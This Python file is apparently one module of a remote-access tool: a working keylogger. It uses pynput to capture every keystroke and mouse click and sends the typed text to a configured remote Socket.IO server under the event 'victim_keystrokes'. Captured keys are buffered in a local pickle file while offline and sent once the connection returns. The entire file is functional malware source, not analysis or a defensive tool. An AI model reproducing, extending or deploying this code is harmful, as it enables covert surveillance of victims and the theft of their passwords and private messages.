import os
import datetime
import pickle
from multiprocessing import Queue

from pynput import keyboard, mouse
import socketio

import config                          # Import config module
from enums import Namespaces, Task, SocketIOEvents     # Import socketio namespaces, events and tasks enums


#   Initialize global variables
KEYSTROKES_NAMESPACE: str = Namespaces.KEYSTROKES.value      # Assign value of KEYSTROKES enum member
keyboardListener = None
mouseListener = None
sio = socketio.Client()
keys = ""                       # Store alphanumeric text
currentKey = ""                 # Store the last released key

#   Socket connection callback
@sio.event(namespace=KEYSTROKES_NAMESPACE)
def connect():
    # Send keys stored offline in file to server
    data = load_from_file()
    if len(data) > 0:
        for i in data:
            print("Key from file", i)
            send_to_server(i)

#   Convert from "key" or "keycode" from string value
def key_to_string(key) -> str:
    string = "{0}".format(key)
    return string[1] if len(string) == 3 else string 

#   Store captured keys to file or send to server
def store_or_send_keys():
    global keys, currentKey

    # No key were pressed/released, so nothing is stored
    if len(keys) == 0:
        return

    # Dictionary with keys and other relevent information
    data = {
        "keys": keys,
        # "added": ""
    }   

    print(data)

    # If the client is connected to the server, send the keys to the server, else write them to file.
    if sio.connected:
        send_to_server(data)        
    else:
        write_to_file(data)

    keys = ""               # Empty the captured keys and current key
    currentKey = ""

# Send keys to server
def send_to_server(data: dict):
    sio.emit("victim_keystrokes", data, KEYSTROKES_NAMESPACE)

# Write keys dictionary to file
def write_to_file(data: dict):
    try: 
        f = open("keys.file", "ab")
        pickle.dump(data, f)
        f.close()
    except:
        pass

#   Load keys dictionaries from file
def load_from_file() -> list:
    file_name = "keys.file"
    data = []
    if os.path.exists(file_name):
        f = open(file_name, "rb")
        while True:
            try:
                data.append(pickle.load(f))
            except EOFError:
                break
        f.close()

        os.remove(file_name)

    return data


def manage_keys():
    global keys, currentKey 

    print(keys)
    print(key_to_string(currentKey))

    if currentKey == keyboard.Key.space and len(keys) > 0:        # If
        keys += " "
        return

    if currentKey == keyboard.Key.space and len(keys) == 0:       # If
        keys = "Key.space"
        store_or_send_keys()
        return

    if len(pressedKey := key_to_string(currentKey)) == 1:         # If
        keys += pressedKey
        return
    else:
        store_or_send_keys()
        keys = pressedKey
        store_or_send_keys()


# Fired on keyboard key release
def on_release(key):

    # DEBUG
    print("{0} released".format(key))
    
    global currentKey
    currentKey = key
    manage_keys()


# Fired on mouse click and release
def on_click(x, y, button, pressed):
    if not pressed:

        # DEBUG
        print("Mouse key pressed!")

        store_or_send_keys()


def keylogger(communicationQueue: Queue):

    # Connect to server
    try:
        sio.connect("http://{}:{}/?userType={}&uuid={}".format(config.SERVER, config.PORT, config.USER_TYPE, config.UUID), namespaces=[KEYSTROKES_NAMESPACE])
        print("Sio ID: {}".format(sio.sid))
    except:
        pass

    #DEBUG
    print("Ready")

    # Create keyboard listener
    global keyboardListener
    keyboardListener = keyboard.Listener(on_release=on_release)

    # Create mouse listener
    global mouseListener 
    mouseListener = mouse.Listener(on_click=on_click)

    keyboardListener.start()        # Start keyboard listener
    mouseListener.start()           # Start mouse listener

    # The keylogger needs to run even when the server is unavailable, so "sio.wait()" is not used.
    listening = True
    while listening:
        try: 
            if communicationQueue.empty() == False:
                task = communicationQueue.get()
                if task == Task.STOP.value:
                    raise Exception("Stopping keylogger")
        except:
            listening = False           # Stop the loop by setting the "listening" flag to False
            keyboardListener.stop()     # Stop the keyboard listener
            mouseListener.stop()        # Stop the mouse listener

            if sio.connected:           # Disconnect from the server if it is connected
                sio.disconnect()


if __name__ == "__main__":
    keylogger(Queue())